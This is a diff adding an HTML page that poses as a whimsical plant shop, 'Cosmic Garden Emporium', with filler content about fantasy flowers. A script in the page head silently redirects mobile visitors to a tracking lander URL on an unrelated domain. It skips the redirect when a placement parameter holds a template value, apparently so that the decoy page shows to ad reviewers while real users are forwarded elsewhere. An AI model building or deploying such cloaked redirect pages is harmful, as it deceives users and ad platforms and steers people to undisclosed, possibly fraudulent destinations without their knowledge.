@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Garden Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        .box {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Garden Emporium</h1>
+    </header>
+    <div class="container">
+        <div class="box">
+            <h2>Stardust Roses</h2>
+            <p>Flowers that shimmer like the night sky</p>
+        </div>
+        <div class="box">
+            <h2>Gravity-Defying Ferns</h2>
+            <p>Plants that float in mid-air</p>
+        </div>
+        <div class="box">
+            <h2>Nebula Orchids</h2>
+            <p>Blooms that change color with the phases of the moon</p>
+        </div>
+        <div class="box">
+            <h2>Quantum Cacti</h2>
+            <p>Succulents that exist in multiple dimensions</p>
+        </div>
+        <div class="box">
+            <h2>Time-Traveling Tulips</h2>
+            <p>Flowers that bloom backwards through time</p>
+        </div>
+        <div class="box">
+            <h2>Alien Aloe</h2>
+            <p>Healing plants from distant galaxies</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html" style="color: #ffffff;">Privacy Policy</a>
+    </footer>
+</body>
+</html>
